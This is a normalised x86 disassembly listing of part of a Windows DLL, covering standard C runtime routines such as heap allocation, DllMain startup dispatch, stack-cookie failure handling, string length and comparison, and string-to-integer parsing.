mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_10013f17
pop ecx
call sub_10015c7f
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_10013dc7
push 0x1e
call sub_10013c18
push 0xff
call sub_10014603
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_10015c7f
mov [ eax ] esi
push ebx
call sub_10013f17
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_10015c7f
mov [ eax ] esi
sub_100135cb
push 0x8
push r--data
call sub_100148a0
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
xor edi edi
cmp eax edi
jne r-xdata
call sub_10016bc1
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rw-data ] edi
jle r-xdata
call sub_10015813
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x3
jne r-xdata
call sub_100154be
push 0x214
push 0x1
call sub_1001450b
pop ecx
pop ecx
mov esi eax
cmp esi edi
je r-xdata
dec [ rw-data ]
mov [ ebp - 0x4 ] edi
cmp [ rw-data ] edi
jne r-xdata
call sub_10017253
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_100171bc
mov [ rw-data ] eax
call sub_10016bf3
test eax eax
jns r-xdata
call sub_10016bdf
jmp r-xdata
call sub_100148e5
retn 0xc
xor eax eax
inc eax
push edi
call sub_100157a5
pop ecx
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] edi
jne r-xdata
call sub_10014871
call sub_10017101
test eax eax
js r-xdata
call sub_100154f2
jmp r-xdata
push esi
call sub_100134fd
pop ecx
jmp r-xdata
push edi
push esi
call sub_1001552f
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
or [ esi + 0x4 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100136a4
jmp r-xdata
call sub_10016e38
call sub_100154f2
call sub_10016bdf
call sub_10016e38
jmp r-xdata
call sub_10016e8b
test eax eax
js r-xdata
push 0x0
call sub_10014684
pop ecx
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_1001372f
push 0xc
push r--data
call sub_100148a0
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi eax
je r-xdata
cmp [ rw-data ] edx
je r-xdata
mov eax [ r--data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
push edi
push esi
push ebx
call DllMain
mov [ ebp - 0x1c ] eax
cmp esi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
push edi
push esi
push ebx
call sub_100135cb
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
push edi
push esi
push ebx
call sub_100135cb
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
push eax
push ebx
call DllMain
push edi
push 0x0
push ebx
call sub_100135cb
mov eax [ r--data ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push edi
push 0x0
push ebx
call eax
mov eax [ r--data ]
test eax eax
je r-xdata
call sub_100148e5
retn
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
_start
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_1001372f
pop ecx
pop ebp
retn 0xc
call sub_10017409
sub_10013848
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_10013894
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_100174a4
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_100174a4
pop ecx
sub_1001399a
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_10015c7f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_10015c7f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_10015c2d
mov eax esi
jmp r-xdata
sub_10013a00
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_10013b9e
call sub_10017501
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_1001750e
pop ecx
push 0x3
call sub_1001485b
int3
push 0x1
push 0x40000015
push 0x3
call sub_10015ab2
add esp 0xc
sub_10013bd1
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_10013bf2
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_10013c18
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_10013bf2
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10012771
leave
retn
push 0x3
call sub_100179dd
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_100179dd
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_1001797a
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_10013a00
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_10015bdb
push esi
call sub_1001795f
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_1001797a
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_1001781d
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_1001795f
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_10017892
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_1001781d
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_100176b1
add esp 0xc
jmp r-xdata
sub_10013dc7
push 0x3
call sub_100179dd
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_10013c18
push 0xff
call sub_10013c18
pop ecx
pop ecx
push 0x3
call sub_100179dd
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_10013e0f
push 0xc
push r--data
call sub_100148a0
push 0xe
call sub_10017bb6
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10013e76
call sub_100148e5
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_100134fd
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_100134fd
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_10013e80
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_10013f17
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_10013f40
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_10013fa8
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
call sub_10013009
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
test eax eax
je r-xdata
test esi esi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_10015c7f
mov [ eax ] 0x16
call sub_10015c2d
cmp [ ebp - 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
push ebx
mov bl [ esi ]
push edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x1c ]
push eax
movzx eax bl
push 0x8
push eax
call sub_10017d42
mov ecx [ ebp - 0x1c ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
js r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
mov esi [ ecx + 0xc8 ]
mov [ ebp - 0x8 ] edx
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
and ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
lea ecx [ ebx - 0x61 ]
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
mov bl [ edi + 0x1 ]
add edi 0x2
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_10015c7f
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
imul edx [ ebp + 0x14 ]
add edx ecx
mov [ ebp - 0x4 ] edx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
mov edx ecx
and edx 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x8 ]
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
pop edi
pop ebx
sub_100141d3
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_10013fa8
add esp 0x14
pop ebp
retn
sub_100141fe
mov edi edi
push ebp
mov ebp esp
sub esp 0x3c
push ebx
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x3c ]
call sub_10013009
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
xor ebx ebx
cmp ecx ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov [ ecx ] eax
cmp [ ebp + 0x14 ] ebx
je r-xdata
call sub_10015c7f
mov [ eax ] 0x16
call sub_10015c2d
cmp [ ebp - 0x30 ] bl
je r-xdata
mov cl [ eax ]
push esi
mov esi [ ebp - 0x3c ]
push edi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x1 ] cl
lea edi [ eax + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x34 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ ebp - 0x1 ]
mov ecx [ esi + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x3c ]
push eax
movzx eax [ ebp - 0x1 ]
push 0x8
push eax
call sub_10017d42
mov esi [ ebp - 0x3c ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x1 ] 0x2d
mov [ ebp - 0x8 ] edi
jne r-xdata
mov al [ edi ]
mov [ ebp - 0x1 ] al
inc edi
jmp r-xdata
cmp eax ebx
je r-xdata
cmp [ ebp - 0x1 ] 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ esi + 0xac ] 0x1
jle r-xdata
push 0x10
pop ecx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov al [ edi ]
inc edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x1 ] al
cmp [ ebp + 0x14 ] ecx
jne r-xdata
cmp [ ebp - 0x1 ] 0x30
je r-xdata
mov eax [ ebp + 0x14 ]
cdq
push edx
mov edi eax
push edi
push 0xffffffff
push 0xffffffff
mov [ ebp - 0x28 ] edx
call sub_10017e40
mov [ ebp - 0x20 ] ebx
mov ebx [ esi + 0xc8 ]
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] edx
cmp [ ebp - 0x1 ] 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
and eax 0x103
je r-xdata
movsx esi cl
sub esi 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] ecx
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec [ ebp - 0x8 ]
test al 0x8
jne r-xdata
lea eax [ ecx - 0x61 ]
cmp al 0x19
movsx eax cl
ja r-xdata
cmp esi [ ebp + 0x14 ]
jae r-xdata
mov al [ edi + 0x1 ]
add edi 0x2
mov [ ebp - 0x1 ] al
mov [ ebp - 0x8 ] edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
mov ebx 0x80000000
test al 0x4
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] eax
je r-xdata
lea esi [ eax - 0x37 ]
sub eax 0x20
mov ecx [ ebp - 0x10 ]
or [ ebp + 0x18 ] 0x8
cmp ecx [ ebp - 0x18 ]
jb r-xdata
call sub_10015c7f
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ecx
push ecx
push [ ebp - 0x14 ]
push [ ebp - 0x28 ]
push edi
call sub_10017e00
xor ecx ecx
add eax esi
adc edx ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
ja r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
or [ ebp - 0x14 ] 0xffffffff
or [ ebp - 0x10 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
pop edi
pop esi
test eax eax
je r-xdata
and eax 0x2
je r-xdata
mov cl [ ebp - 0x1 ]
movzx eax cl
movzx eax [ ebx + eax * 2 ]
mov edx eax
and edx 0x4
je r-xdata
mov eax [ ebp - 0x1c ]
cmp [ ebp - 0x14 ] eax
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x1c ]
jb r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov [ ebp - 0x10 ] esi
and [ ebp - 0x14 ] 0x0
mov [ ebp - 0x10 ] ebx
jmp r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x10 ] ebx
ja r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x18 ]
jne r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x10 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] ecx
cmp [ ebp - 0x10 ] esi
jb r-xdata
jb r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax ]
inc [ ebp - 0x8 ]
mov [ ebp - 0x1 ] al
jmp r-xdata
xor eax eax
cmp eax [ ebp - 0x20 ]
jb r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x34 ]
and [ eax + 0x70 ] 0xfffffffd
ja r-xdata
cmp [ ebp - 0x14 ] 0x0
ja r-xdata
ja r-xdata
cmp [ ebp - 0x14 ] 0xffffffff
jbe r-xdata
cmp esi [ ebp - 0x24 ]
jbe r-xdata
sub_1001449b
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_100141fe
add esp 0x14
pop ebp
retn
sub_100144c6
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_10013537
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_1001450b
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10017ed5
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_10014557
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10017f57
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_100145a5
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_10015c7f
mov [ eax ] 0x16
call sub_10015c2d
or eax 0xffffffff
pop ebp
retn
sub_100145d8
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_1001462d
mov edi edi
push esi
call sub_100154ac
mov esi eax
push esi
call sub_10013f08
push esi
call sub_10015aa3
push esi
call sub_10013e00
push esi
call sub_10018099
push esi
call sub_100174ac
push esi
call sub_10018088
add esp 0x18
pop esi
retn
sub_10014660
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_10014684
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_100180a8
push r--data
push r--data
call sub_10014660
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_10018160
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_10017279
call sub_10012f92
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_10018160
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_1001471b
push 0x20
push r--data
call sub_100148a0
push 0x8
call sub_10017bb6
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10014846
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_100148e5
retn
mov [ rw-data ] 0x1
push 0x8
call sub_10017add
pop ecx
push [ ebp + 0x8 ]
call sub_10014603
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
